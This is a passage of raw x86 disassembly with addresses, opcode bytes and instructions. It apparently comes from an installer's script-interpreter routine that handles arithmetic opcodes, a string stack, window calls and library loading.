  401e94:	eb 02                	jmp    0x401e98
  401e96:	8b f5                	mov    %ebp,%esi
  401e98:	33 db                	xor    %ebx,%ebx
  401e9a:	85 c9                	test   %ecx,%ecx
  401e9c:	0f 94 c3             	sete   %bl
  401e9f:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  401ea3:	eb 43                	jmp    0x401ee8
  401ea5:	0b f1                	or     %ecx,%esi
  401ea7:	eb 3f                	jmp    0x401ee8
  401ea9:	23 f1                	and    %ecx,%esi
  401eab:	eb 3b                	jmp    0x401ee8
  401ead:	33 f1                	xor    %ecx,%esi
  401eaf:	eb 37                	jmp    0x401ee8
  401eb1:	33 c0                	xor    %eax,%eax
  401eb3:	85 f6                	test   %esi,%esi
  401eb5:	0f 94 c0             	sete   %al
  401eb8:	8b f0                	mov    %eax,%esi
  401eba:	eb 2c                	jmp    0x401ee8
  401ebc:	85 f6                	test   %esi,%esi
  401ebe:	75 04                	jne    0x401ec4
  401ec0:	85 c9                	test   %ecx,%ecx
  401ec2:	74 09                	je     0x401ecd
  401ec4:	33 f6                	xor    %esi,%esi
  401ec6:	46                   	inc    %esi
  401ec7:	eb 1f                	jmp    0x401ee8
  401ec9:	85 f6                	test   %esi,%esi
  401ecb:	75 f3                	jne    0x401ec0
  401ecd:	8b f5                	mov    %ebp,%esi
  401ecf:	eb 17                	jmp    0x401ee8
  401ed1:	85 c9                	test   %ecx,%ecx
  401ed3:	74 c1                	je     0x401e96
  401ed5:	8b c6                	mov    %esi,%eax
  401ed7:	99                   	cltd
  401ed8:	f7 f9                	idiv   %ecx
  401eda:	8b f2                	mov    %edx,%esi
  401edc:	eb ba                	jmp    0x401e98
  401ede:	d3 e6                	shl    %cl,%esi
  401ee0:	eb 06                	jmp    0x401ee8
  401ee2:	d3 fe                	sar    %cl,%esi
  401ee4:	eb 02                	jmp    0x401ee8
  401ee6:	d3 ee                	shr    %cl,%esi
  401ee8:	56                   	push   %esi
  401ee9:	e9 39 f8 ff ff       	jmp    0x401727
  401eee:	6a 01                	push   $0x1
  401ef0:	e8 56 16 00 00       	call   0x40354b
  401ef5:	6a 02                	push   $0x2
  401ef7:	8b f0                	mov    %eax,%esi
  401ef9:	e8 11 16 00 00       	call   0x40350f
  401efe:	50                   	push   %eax
  401eff:	56                   	push   %esi
  401f00:	57                   	push   %edi
  401f01:	ff 15 68 92 40 00    	call   *0x409268
  401f07:	83 c4 10             	add    $0x10,%esp
  401f0a:	e9 99 14 00 00       	jmp    0x4033a8
  401f0f:	8b 44 24 38          	mov    0x38(%esp),%eax
  401f13:	8b 35 00 c1 40 00    	mov    0x40c100,%esi
  401f19:	85 c0                	test   %eax,%eax
  401f1b:	74 5f                	je     0x401f7c
  401f1d:	48                   	dec    %eax
  401f1e:	85 f6                	test   %esi,%esi
  401f20:	74 37                	je     0x401f59
  401f22:	8b 36                	mov    (%esi),%esi
  401f24:	85 c0                	test   %eax,%eax
  401f26:	75 f5                	jne    0x401f1d
  401f28:	85 f6                	test   %esi,%esi
  401f2a:	74 2d                	je     0x401f59
  401f2c:	83 c6 04             	add    $0x4,%esi
  401f2f:	bf 08 c1 40 00       	mov    $0x40c108,%edi
  401f34:	56                   	push   %esi
  401f35:	57                   	push   %edi
  401f36:	e8 75 54 00 00       	call   0x4073b0
  401f3b:	a1 00 c1 40 00       	mov    0x40c100,%eax
  401f40:	83 c0 04             	add    $0x4,%eax
  401f43:	50                   	push   %eax
  401f44:	56                   	push   %esi
  401f45:	e8 66 54 00 00       	call   0x4073b0
  401f4a:	a1 00 c1 40 00       	mov    0x40c100,%eax
  401f4f:	57                   	push   %edi
  401f50:	83 c0 04             	add    $0x4,%eax
  401f53:	50                   	push   %eax
  401f54:	e9 e2 10 00 00       	jmp    0x40303b
  401f59:	ff 74 24 38          	push   0x38(%esp)
  401f5d:	68 c4 98 40 00       	push   $0x4098c4
  401f62:	e8 bd 4e 00 00       	call   0x406e24
  401f67:	59                   	pop    %ecx
  401f68:	59                   	pop    %ecx
  401f69:	68 10 00 20 00       	push   $0x200010
  401f6e:	6a e8                	push   $0xffffffe8
  401f70:	55                   	push   %ebp
  401f71:	e8 1b 45 00 00       	call   0x406491
  401f76:	50                   	push   %eax
  401f77:	e9 ff fc ff ff       	jmp    0x401c7b
  401f7c:	85 d2                	test   %edx,%edx
  401f7e:	74 2b                	je     0x401fab
  401f80:	85 f6                	test   %esi,%esi
  401f82:	75 10                	jne    0x401f94
  401f84:	68 f8 98 40 00       	push   $0x4098f8
  401f89:	e8 96 4e 00 00       	call   0x406e24
  401f8e:	59                   	pop    %ecx
  401f8f:	e9 9a fa ff ff       	jmp    0x401a2e
  401f94:	8d 46 04             	lea    0x4(%esi),%eax
  401f97:	50                   	push   %eax
  401f98:	57                   	push   %edi
  401f99:	e8 12 54 00 00       	call   0x4073b0
  401f9e:	8b 06                	mov    (%esi),%eax
  401fa0:	a3 00 c1 40 00       	mov    %eax,0x40c100
  401fa5:	56                   	push   %esi
  401fa6:	e9 42 05 00 00       	jmp    0x4024ed
  401fab:	68 04 40 00 00       	push   $0x4004
  401fb0:	6a 40                	push   $0x40
  401fb2:	ff 15 f8 90 40 00    	call   *0x4090f8
  401fb8:	ff 74 24 30          	push   0x30(%esp)
  401fbc:	8b f0                	mov    %eax,%esi
  401fbe:	8d 46 04             	lea    0x4(%esi),%eax
  401fc1:	50                   	push   %eax
  401fc2:	e8 ca 44 00 00       	call   0x406491
  401fc7:	a1 00 c1 40 00       	mov    0x40c100,%eax
  401fcc:	89 06                	mov    %eax,(%esi)
  401fce:	89 35 00 c1 40 00    	mov    %esi,0x40c100
  401fd4:	e9 cf 13 00 00       	jmp    0x4033a8
  401fd9:	6a 03                	push   $0x3
  401fdb:	e8 2f 15 00 00       	call   0x40350f
  401fe0:	6a 04                	push   $0x4
  401fe2:	89 44 24 30          	mov    %eax,0x30(%esp)
  401fe6:	e8 24 15 00 00       	call   0x40350f
  401feb:	8b f0                	mov    %eax,%esi
  401fed:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  401ff1:	89 74 24 20          	mov    %esi,0x20(%esp)
  401ff5:	59                   	pop    %ecx
  401ff6:	59                   	pop    %ecx
  401ff7:	a8 01                	test   $0x1,%al
  401ff9:	74 0f                	je     0x40200a
  401ffb:	6a 33                	push   $0x33
  401ffd:	e8 49 15 00 00       	call   0x40354b
  402002:	89 44 24 28          	mov    %eax,0x28(%esp)
  402006:	8b 44 24 44          	mov    0x44(%esp),%eax
  40200a:	a8 02                	test   $0x2,%al
  40200c:	74 0d                	je     0x40201b
  40200e:	6a 44                	push   $0x44
  402010:	e8 36 15 00 00       	call   0x40354b
  402015:	8b f0                	mov    %eax,%esi
  402017:	89 44 24 18          	mov    %eax,0x18(%esp)
  40201b:	83 7c 24 2c 21       	cmpl   $0x21,0x2c(%esp)
  402020:	6a 01                	push   $0x1
  402022:	75 55                	jne    0x402079
  402024:	e8 e6 14 00 00       	call   0x40350f
  402029:	6a 02                	push   $0x2
  40202b:	89 44 24 20          	mov    %eax,0x20(%esp)
  40202f:	e8 db 14 00 00       	call   0x40350f
  402034:	59                   	pop    %ecx
  402035:	59                   	pop    %ecx
  402036:	8b 4c 24 44          	mov    0x44(%esp),%ecx
  40203a:	c1 f9 02             	sar    $0x2,%ecx
  40203d:	85 c9                	test   %ecx,%ecx
  40203f:	74 26                	je     0x402067
  402041:	8d 54 24 14          	lea    0x14(%esp),%edx
  402045:	52                   	push   %edx
  402046:	51                   	push   %ecx
  402047:	55                   	push   %ebp
  402048:	56                   	push   %esi
  402049:	ff 74 24 38          	push   0x38(%esp)
  40204d:	50                   	push   %eax
  40204e:	ff 74 24 30          	push   0x30(%esp)
  402052:	ff 15 60 92 40 00    	call   *0x409260
  402058:	f7 d8                	neg    %eax
  40205a:	1b db                	sbb    %ebx,%ebx
  40205c:	8b 44 24 14          	mov    0x14(%esp),%eax
  402060:	43                   	inc    %ebx
  402061:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  402065:	eb 44                	jmp    0x4020ab
  402067:	56                   	push   %esi
  402068:	ff 74 24 2c          	push   0x2c(%esp)
  40206c:	50                   	push   %eax
  40206d:	ff 74 24 24          	push   0x24(%esp)
  402071:	ff 15 64 92 40 00    	call   *0x409264
  402077:	eb 2e                	jmp    0x4020a7
  402079:	e8 cd 14 00 00       	call   0x40354b
  40207e:	6a 12                	push   $0x12
  402080:	8b f0                	mov    %eax,%esi
  402082:	e8 c4 14 00 00       	call   0x40354b
  402087:	33 c9                	xor    %ecx,%ecx
  402089:	66 39 28             	cmp    %bp,(%eax)
  40208c:	0f 45 c8             	cmovne %eax,%ecx
  40208f:	51                   	push   %ecx
  402090:	33 c9                	xor    %ecx,%ecx
  402092:	66 39 2e             	cmp    %bp,(%esi)
  402095:	0f 45 ce             	cmovne %esi,%ecx
  402098:	51                   	push   %ecx
  402099:	ff 74 24 20          	push   0x20(%esp)
  40209d:	ff 74 24 34          	push   0x34(%esp)
  4020a1:	ff 15 34 92 40 00    	call   *0x409234
  4020a7:	89 44 24 14          	mov    %eax,0x14(%esp)
  4020ab:	39 6c 24 30          	cmp    %ebp,0x30(%esp)
  4020af:	0f 8c f3 12 00 00    	jl     0x4033a8
  4020b5:	e9 57 fc ff ff       	jmp    0x401d11
  4020ba:	55                   	push   %ebp
  4020bb:	e8 4f 14 00 00       	call   0x40350f
  4020c0:	59                   	pop    %ecx
  4020c1:	50                   	push   %eax
  4020c2:	ff 15 58 92 40 00    	call   *0x409258
  4020c8:	85 c0                	test   %eax,%eax
  4020ca:	0f 84 1b f8 ff ff    	je     0x4018eb
  4020d0:	e9 fb f7 ff ff       	jmp    0x4018d0
  4020d5:	6a 02                	push   $0x2
  4020d7:	e8 33 14 00 00       	call   0x40350f
  4020dc:	6a 01                	push   $0x1
  4020de:	8b f0                	mov    %eax,%esi
  4020e0:	e8 2a 14 00 00       	call   0x40350f
  4020e5:	59                   	pop    %ecx
  4020e6:	59                   	pop    %ecx
  4020e7:	56                   	push   %esi
  4020e8:	50                   	push   %eax
  4020e9:	ff 15 50 92 40 00    	call   *0x409250
  4020ef:	e9 1d fc ff ff       	jmp    0x401d11
  4020f4:	8b 35 68 e2 47 00    	mov    0x47e268,%esi
  4020fa:	55                   	push   %ebp
  4020fb:	03 f2                	add    %edx,%esi
  4020fd:	e8 0d 14 00 00       	call   0x40350f
  402102:	59                   	pop    %ecx
  402103:	56                   	push   %esi
  402104:	6a eb                	push   $0xffffffeb
  402106:	50                   	push   %eax
  402107:	ff 15 38 92 40 00    	call   *0x409238
  40210d:	e9 96 12 00 00       	jmp    0x4033a8
  402112:	f7 44 24 3c 00 01 00 	testl  $0x100,0x3c(%esp)
  402119:	00 
  40211a:	74 0a                	je     0x402126
  40211c:	6a 02                	push   $0x2
  40211e:	e8 ec 13 00 00       	call   0x40350f
  402123:	59                   	pop    %ecx
  402124:	eb 0b                	jmp    0x402131
  402126:	ff 74 24 38          	push   0x38(%esp)
  40212a:	50                   	push   %eax
  40212b:	ff 15 50 92 40 00    	call   *0x409250
  402131:	89 44 24 14          	mov    %eax,0x14(%esp)
  402135:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  402139:	8b c8                	mov    %eax,%ecx
  40213b:	83 e1 04             	and    $0x4,%ecx
  40213e:	8b e8                	mov    %eax,%ebp
  402140:	89 4c 24 50          	mov    %ecx,0x50(%esp)
  402144:	8b f0                	mov    %eax,%esi
  402146:	c1 ed 1e             	shr    $0x1e,%ebp
  402149:	8b c8                	mov    %eax,%ecx
  40214b:	c1 e9 1f             	shr    $0x1f,%ecx
  40214e:	83 e6 03             	and    $0x3,%esi
  402151:	83 e5 01             	and    $0x1,%ebp
  402154:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  402158:	a9 00 00 01 00       	test   $0x10000,%eax
  40215d:	74 09                	je     0x402168
  40215f:	6a 11                	push   $0x11
  402161:	e8 e5 13 00 00       	call   0x40354b
  402166:	eb 05                	jmp    0x40216d
  402168:	0f b7 44 24 34       	movzwl 0x34(%esp),%eax
  40216d:	89 44 24 18          	mov    %eax,0x18(%esp)
  402171:	8d 44 24 54          	lea    0x54(%esp),%eax
  402175:	50                   	push   %eax
  402176:	ff 74 24 18          	push   0x18(%esp)
  40217a:	ff 15 70 92 40 00    	call   *0x409270
  402180:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  402184:	25 f0 fe 00 00       	and    $0xfef0,%eax
  402189:	50                   	push   %eax
  40218a:	8b 44 24 64          	mov    0x64(%esp),%eax
  40218e:	0f af c5             	imul   %ebp,%eax
  402191:	50                   	push   %eax
  402192:	8b 44 24 64          	mov    0x64(%esp),%eax
  402196:	0f af 44 24 28       	imul   0x28(%esp),%eax
  40219b:	50                   	push   %eax
  40219c:	33 c0                	xor    %eax,%eax
  40219e:	39 44 24 5c          	cmp    %eax,0x5c(%esp)
  4021a2:	56                   	push   %esi
  4021a3:	ff 74 24 28          	push   0x28(%esp)
  4021a7:	0f 45 05 14 62 47 00 	cmovne 0x476214,%eax
  4021ae:	50                   	push   %eax
  4021af:	ff 15 30 92 40 00    	call   *0x409230
  4021b5:	8b e8                	mov    %eax,%ebp
  4021b7:	55                   	push   %ebp
  4021b8:	56                   	push   %esi
  4021b9:	68 72 01 00 00       	push   $0x172
  4021be:	ff 74 24 20          	push   0x20(%esp)
  4021c2:	ff 15 64 92 40 00    	call   *0x409264
  4021c8:	85 c0                	test   %eax,%eax
  4021ca:	74 0b                	je     0x4021d7
  4021cc:	85 f6                	test   %esi,%esi
  4021ce:	75 07                	jne    0x4021d7
  4021d0:	50                   	push   %eax
  4021d1:	ff 15 5c 90 40 00    	call   *0x40905c
  4021d7:	83 7c 24 30 00       	cmpl   $0x0,0x30(%esp)
  4021dc:	0f 8c c6 11 00 00    	jl     0x4033a8
  4021e2:	55                   	push   %ebp
  4021e3:	e9 3f f5 ff ff       	jmp    0x401727
  4021e8:	50                   	push   %eax
  4021e9:	ff 15 44 92 40 00    	call   *0x409244
  4021ef:	6a 02                	push   $0x2
  4021f1:	8b f8                	mov    %eax,%edi
  4021f3:	e8 17 13 00 00       	call   0x40350f
  4021f8:	59                   	pop    %ecx
  4021f9:	6a 48                	push   $0x48
  4021fb:	6a 5a                	push   $0x5a
  4021fd:	57                   	push   %edi
  4021fe:	8b f0                	mov    %eax,%esi
  402200:	ff 15 54 90 40 00    	call   *0x409054
  402206:	50                   	push   %eax
  402207:	56                   	push   %esi
  402208:	ff 15 f0 90 40 00    	call   *0x4090f0
  40220e:	f7 d8                	neg    %eax
  402210:	a3 08 01 42 00       	mov    %eax,0x420108
  402215:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402219:	57                   	push   %edi
  40221a:	50                   	push   %eax
  40221b:	ff 15 40 92 40 00    	call   *0x409240
  402221:	6a 03                	push   $0x3
  402223:	e8 e7 12 00 00       	call   0x40350f
  402228:	59                   	pop    %ecx
  402229:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  40222d:	ff 74 24 34          	push   0x34(%esp)
  402231:	a3 18 01 42 00       	mov    %eax,0x420118
  402236:	8a c1                	mov    %cl,%al
  402238:	24 01                	and    $0x1,%al
  40223a:	c6 05 1f 01 42 00 01 	movb   $0x1,0x42011f
  402241:	a2 1c 01 42 00       	mov    %al,0x42011c
  402246:	8a c1                	mov    %cl,%al
  402248:	24 02                	and    $0x2,%al
  40224a:	80 e1 04             	and    $0x4,%cl
  40224d:	68 24 01 42 00       	push   $0x420124
  402252:	a2 1d 01 42 00       	mov    %al,0x42011d
  402257:	88 0d 1e 01 42 00    	mov    %cl,0x42011e
  40225d:	e8 2f 42 00 00       	call   0x406491
  402262:	68 08 01 42 00       	push   $0x420108
  402267:	ff 15 68 90 40 00    	call   *0x409068
  40226d:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  402271:	50                   	push   %eax
  402272:	55                   	push   %ebp
  402273:	e9 b0 f4 ff ff       	jmp    0x401728
  402278:	55                   	push   %ebp
  402279:	e8 91 12 00 00       	call   0x40350f
  40227e:	6a 01                	push   $0x1
  402280:	8b f0                	mov    %eax,%esi
  402282:	e8 88 12 00 00       	call   0x40350f
  402287:	8b f8                	mov    %eax,%edi
  402289:	59                   	pop    %ecx
  40228a:	59                   	pop    %ecx
  40228b:	39 6c 24 38          	cmp    %ebp,0x38(%esp)
  40228f:	74 0b                	je     0x40229c
  402291:	68 1c 99 40 00       	push   $0x40991c
  402296:	e8 89 4b 00 00       	call   0x406e24
  40229b:	59                   	pop    %ecx
  40229c:	57                   	push   %edi
  40229d:	56                   	push   %esi
  40229e:	39 6c 24 44          	cmp    %ebp,0x44(%esp)
  4022a2:	75 0b                	jne    0x4022af
  4022a4:	ff 15 54 92 40 00    	call   *0x409254
  4022aa:	e9 f9 10 00 00       	jmp    0x4033a8
  4022af:	ff 15 4c 92 40 00    	call   *0x40924c
  4022b5:	e9 ee 10 00 00       	jmp    0x4033a8
  4022ba:	55                   	push   %ebp
  4022bb:	e8 8b 12 00 00       	call   0x40354b
  4022c0:	6a 31                	push   $0x31
  4022c2:	8b f0                	mov    %eax,%esi
  4022c4:	e8 82 12 00 00       	call   0x40354b
  4022c9:	6a 22                	push   $0x22
  4022cb:	89 44 24 18          	mov    %eax,0x18(%esp)
  4022cf:	e8 77 12 00 00       	call   0x40354b
  4022d4:	6a 15                	push   $0x15
  4022d6:	8b f8                	mov    %eax,%edi
  4022d8:	e8 6e 12 00 00       	call   0x40354b
  4022dd:	68 08 01 41 00       	push   $0x410108
  4022e2:	6a ec                	push   $0xffffffec
  4022e4:	e8 28 40 00 00       	call   0x406311
  4022e9:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  4022ed:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4022f1:	89 44 24 5c          	mov    %eax,0x5c(%esp)
  4022f5:	33 c0                	xor    %eax,%eax
  4022f7:	89 4c 24 58          	mov    %ecx,0x58(%esp)
  4022fb:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  4022ff:	89 4c 24 70          	mov    %ecx,0x70(%esp)
  402303:	66 39 2e             	cmp    %bp,(%esi)
  402306:	0f 45 c6             	cmovne %esi,%eax
  402309:	89 44 24 60          	mov    %eax,0x60(%esp)
  40230d:	8b 44 24 14          	mov    0x14(%esp),%eax
  402311:	89 44 24 64          	mov    %eax,0x64(%esp)
  402315:	33 c0                	xor    %eax,%eax
  402317:	66 39 2f             	cmp    %bp,(%edi)
  40231a:	c7 44 24 6c 00 70 4d 	movl   $0x4d7000,0x6c(%esp)
  402321:	00 
  402322:	0f 45 c7             	cmovne %edi,%eax
  402325:	89 44 24 68          	mov    %eax,0x68(%esp)
  402329:	8d 44 24 54          	lea    0x54(%esp),%eax
  40232d:	50                   	push   %eax
  40232e:	e8 56 4f 00 00       	call   0x407289
  402333:	85 c0                	test   %eax,%eax
  402335:	75 1f                	jne    0x402356
  402337:	ff 15 0c 91 40 00    	call   *0x40910c
  40233d:	50                   	push   %eax
  40233e:	57                   	push   %edi
  40233f:	ff 74 24 1c          	push   0x1c(%esp)
  402343:	56                   	push   %esi
  402344:	68 38 99 40 00       	push   $0x409938
  402349:	e8 d6 4a 00 00       	call   0x406e24
  40234e:	83 c4 14             	add    $0x14,%esp
  402351:	e9 d8 f6 ff ff       	jmp    0x401a2e
  402356:	f6 44 24 58 40       	testb  $0x40,0x58(%esp)
  40235b:	74 19                	je     0x402376
  40235d:	ff b4 24 8c 00 00 00 	push   0x8c(%esp)
  402364:	e8 81 47 00 00       	call   0x406aea
  402369:	ff b4 24 8c 00 00 00 	push   0x8c(%esp)
  402370:	ff 15 10 91 40 00    	call   *0x409110
  402376:	57                   	push   %edi
  402377:	ff 74 24 18          	push   0x18(%esp)
  40237b:	56                   	push   %esi
  40237c:	68 b0 99 40 00       	push   $0x4099b0
  402381:	e8 9e 4a 00 00       	call   0x406e24
  402386:	e9 7c fb ff ff       	jmp    0x401f07
  40238b:	55                   	push   %ebp
  40238c:	e8 ba 11 00 00       	call   0x40354b
  402391:	8b f8                	mov    %eax,%edi
  402393:	57                   	push   %edi
  402394:	68 14 9a 40 00       	push   $0x409a14
  402399:	e8 86 4a 00 00       	call   0x406e24
  40239e:	59                   	pop    %ecx
  40239f:	59                   	pop    %ecx
  4023a0:	57                   	push   %edi
  4023a1:	6a eb                	push   $0xffffffeb
  4023a3:	e8 69 3f 00 00       	call   0x406311
  4023a8:	57                   	push   %edi
  4023a9:	e8 64 4b 00 00       	call   0x406f12
  4023ae:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4023b2:	8b e8                	mov    %eax,%ebp
  4023b4:	57                   	push   %edi
  4023b5:	85 ed                	test   %ebp,%ebp
  4023b7:	74 3b                	je     0x4023f4
  4023b9:	68 3c 9a 40 00       	push   $0x409a3c
  4023be:	e8 61 4a 00 00       	call   0x406e24
  4023c3:	83 7c 24 40 00       	cmpl   $0x0,0x40(%esp)
  4023c8:	59                   	pop    %ecx
  4023c9:	59                   	pop    %ecx
  4023ca:	74 22                	je     0x4023ee
  4023cc:	55                   	push   %ebp
  4023cd:	e8 18 47 00 00       	call   0x406aea
  4023d2:	83 7c 24 34 00       	cmpl   $0x0,0x34(%esp)
  4023d7:	7c 09                	jl     0x4023e2
  4023d9:	50                   	push   %eax
  4023da:	56                   	push   %esi
  4023db:	e8 ad 49 00 00       	call   0x406d8d
  4023e0:	eb 0c                	jmp    0x4023ee
  4023e2:	33 c9                	xor    %ecx,%ecx
  4023e4:	41                   	inc    %ecx
  4023e5:	85 c0                	test   %eax,%eax
  4023e7:	0f 45 d9             	cmovne %ecx,%ebx
  4023ea:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  4023ee:	55                   	push   %ebp
  4023ef:	e9 bf 08 00 00       	jmp    0x402cb3
  4023f4:	68 68 9a 40 00       	push   $0x409a68
  4023f9:	e9 68 f5 ff ff       	jmp    0x401966
  4023fe:	6a 02                	push   $0x2
  402400:	e8 46 11 00 00       	call   0x40354b
  402405:	50                   	push   %eax
  402406:	e8 32 49 00 00       	call   0x406d3d
  40240b:	8b e8                	mov    %eax,%ebp
  40240d:	85 ed                	test   %ebp,%ebp
  40240f:	74 11                	je     0x402422
  402411:	ff 75 14             	push   0x14(%ebp)
  402414:	56                   	push   %esi
  402415:	e8 73 49 00 00       	call   0x406d8d
  40241a:	ff 75 18             	push   0x18(%ebp)
  40241d:	e9 05 f3 ff ff       	jmp    0x401727
  402422:	33 c0                	xor    %eax,%eax
  402424:	66 89 07             	mov    %ax,(%edi)
  402427:	66 89 06             	mov    %ax,(%esi)
  40242a:	e9 ff f5 ff ff       	jmp    0x401a2e
  40242f:	6a ee                	push   $0xffffffee
  402431:	e8 15 11 00 00       	call   0x40354b
  402436:	8d 4c 24 54          	lea    0x54(%esp),%ecx
  40243a:	89 44 24 50          	mov    %eax,0x50(%esp)
  40243e:	51                   	push   %ecx
  40243f:	50                   	push   %eax
  402440:	6a 0a                	push   $0xa
  402442:	e8 35 4d 00 00       	call   0x40717c
  402447:	ff d0                	call   *%eax
  402449:	33 c9                	xor    %ecx,%ecx
  40244b:	89 44 24 20          	mov    %eax,0x20(%esp)
  40244f:	33 db                	xor    %ebx,%ebx
  402451:	66 89 0f             	mov    %cx,(%edi)
  402454:	43                   	inc    %ebx
  402455:	66 89 0e             	mov    %cx,(%esi)
  402458:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  40245c:	85 c0                	test   %eax,%eax
  40245e:	0f 84 44 0f 00 00    	je     0x4033a8
  402464:	50                   	push   %eax
  402465:	6a 40                	push   $0x40
  402467:	ff 15 f8 90 40 00    	call   *0x4090f8
  40246d:	89 44 24 14          	mov    %eax,0x14(%esp)
  402471:	85 c0                	test   %eax,%eax
  402473:	0f 84 2f 0f 00 00    	je     0x4033a8
  402479:	6a 0b                	push   $0xb
  40247b:	e8 fc 4c 00 00       	call   0x40717c
  402480:	6a 0c                	push   $0xc
  402482:	8b f0                	mov    %eax,%esi
  402484:	e8 f3 4c 00 00       	call   0x40717c
  402489:	ff 74 24 14          	push   0x14(%esp)
  40248d:	89 44 24 50          	mov    %eax,0x50(%esp)
  402491:	ff 74 24 24          	push   0x24(%esp)
  402495:	55                   	push   %ebp
  402496:	ff 74 24 5c          	push   0x5c(%esp)
  40249a:	ff d6                	call   *%esi
  40249c:	85 c0                	test   %eax,%eax
  40249e:	74 49                	je     0x4024e9
  4024a0:	8d 44 24 24          	lea    0x24(%esp),%eax
  4024a4:	50                   	push   %eax
  4024a5:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4024a9:	50                   	push   %eax
  4024aa:	68 ac 9a 40 00       	push   $0x409aac
  4024af:	ff 74 24 20          	push   0x20(%esp)
  4024b3:	ff 54 24 5c          	call   *0x5c(%esp)
  4024b7:	85 c0                	test   %eax,%eax
  4024b9:	74 2e                	je     0x4024e9
  4024bb:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4024bf:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  4024c3:	ff 74 81 08          	push   0x8(%ecx,%eax,4)
  4024c7:	57                   	push   %edi
  4024c8:	e8 c0 48 00 00       	call   0x406d8d
  4024cd:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  4024d1:	8b 44 24 18          	mov    0x18(%esp),%eax
  4024d5:	8b 7c 24 28          	mov    0x28(%esp),%edi
  4024d9:	ff 74 88 0c          	push   0xc(%eax,%ecx,4)
  4024dd:	57                   	push   %edi
  4024de:	e8 aa 48 00 00       	call   0x406d8d
  4024e3:	8b dd                	mov    %ebp,%ebx
  4024e5:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  4024e9:	ff 74 24 14          	push   0x14(%esp)
  4024ed:	ff 15 f4 90 40 00    	call   *0x4090f4
  4024f3:	e9 b0 0e 00 00       	jmp    0x4033a8
  4024f8:	33 f6                	xor    %esi,%esi
  4024fa:	46                   	inc    %esi
  4024fb:	8b de                	mov    %esi,%ebx
  4024fd:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  402501:	39 2d 80 e2 47 00    	cmp    %ebp,0x47e280
  402507:	0f 8c fd 00 00 00    	jl     0x40260a
  40250d:	6a f0                	push   $0xfffffff0
  40250f:	e8 37 10 00 00       	call   0x40354b
  402514:	8b f8                	mov    %eax,%edi
  402516:	56                   	push   %esi
  402517:	89 7c 24 18          	mov    %edi,0x18(%esp)
  40251b:	e8 2b 10 00 00       	call   0x40354b
  402520:	89 44 24 18          	mov    %eax,0x18(%esp)
  402524:	39 6c 24 40          	cmp    %ebp,0x40(%esp)
  402528:	74 11                	je     0x40253b
  40252a:	57                   	push   %edi
  40252b:	ff 15 00 91 40 00    	call   *0x409100
  402531:	8b f8                	mov    %eax,%edi
  402533:	85 ff                	test   %edi,%edi
  402535:	75 18                	jne    0x40254f
  402537:	8b 7c 24 14          	mov    0x14(%esp),%edi
  40253b:	6a 08                	push   $0x8
  40253d:	55                   	push   %ebp
  40253e:	57                   	push   %edi
  40253f:	ff 15 fc 90 40 00    	call   *0x4090fc
  402545:	8b f8                	mov    %eax,%edi
  402547:	85 ff                	test   %edi,%edi
  402549:	0f 84 a1 00 00 00    	je     0x4025f0
  40254f:	ff 74 24 18          	push   0x18(%esp)
  402553:	57                   	push   %edi
  402554:	e8 e6 42 00 00       	call   0x40683f
  402559:	8b c8                	mov    %eax,%ecx
  40255b:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  40255f:	85 c9                	test   %ecx,%ecx
  402561:	74 4a                	je     0x4025ad
  402563:	8b dd                	mov    %ebp,%ebx
  402565:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  402569:	39 5c 24 38          	cmp    %ebx,0x38(%esp)
  40256d:	74 1e                	je     0x40258d
  40256f:	68 08 01 41 00       	push   $0x410108
  402574:	ff 74 24 3c          	push   0x3c(%esp)
  402578:	e8 94 3d 00 00       	call   0x406311
  40257d:	ff 54 24 20          	call   *0x20(%esp)
  402581:	85 c0                	test   %eax,%eax
  402583:	74 46                	je     0x4025cb
  402585:	8b de                	mov    %esi,%ebx
  402587:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  40258b:	eb 3e                	jmp    0x4025cb
  40258d:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402591:	68 00 c0 40 00       	push   $0x40c000
  402596:	68 00 c1 40 00       	push   $0x40c100
  40259b:	68 00 f0 47 00       	push   $0x47f000
  4025a0:	68 00 20 00 00       	push   $0x2000
  4025a5:	50                   	push   %eax
  4025a6:	ff d1                	call   *%ecx
  4025a8:	83 c4 14             	add    $0x14,%esp
  4025ab:	eb 1e                	jmp    0x4025cb
  4025ad:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  4025b1:	55                   	push   %ebp
  4025b2:	6a f7                	push   $0xfffffff7
  4025b4:	e8 58 3d 00 00       	call   0x406311
  4025b9:	ff 74 24 14          	push   0x14(%esp)
  4025bd:	55                   	push   %ebp
  4025be:	68 b0 9a 40 00       	push   $0x409ab0
  4025c3:	e8 5c 48 00 00       	call   0x406e24
  4025c8:	83 c4 0c             	add    $0xc,%esp
  4025cb:	83 7c 24 3c 00       	cmpl   $0x0,0x3c(%esp)
  4025d0:	0f 85 d2 0d 00 00    	jne    0x4033a8
  4025d6:	57                   	push   %edi
  4025d7:	e8 0e 1c 00 00       	call   0x4041ea
  4025dc:	85 c0                	test   %eax,%eax
  4025de:	0f 84 c4 0d 00 00    	je     0x4033a8
  4025e4:	57                   	push   %edi
  4025e5:	ff 15 04 91 40 00    	call   *0x409104
  4025eb:	e9 b8 0d 00 00       	jmp    0x4033a8
  4025f0:	68 08 01 41 00       	push   $0x410108
  4025f5:	6a f6                	push   $0xfffffff6
  4025f7:	e8 15 3d 00 00       	call   0x406311
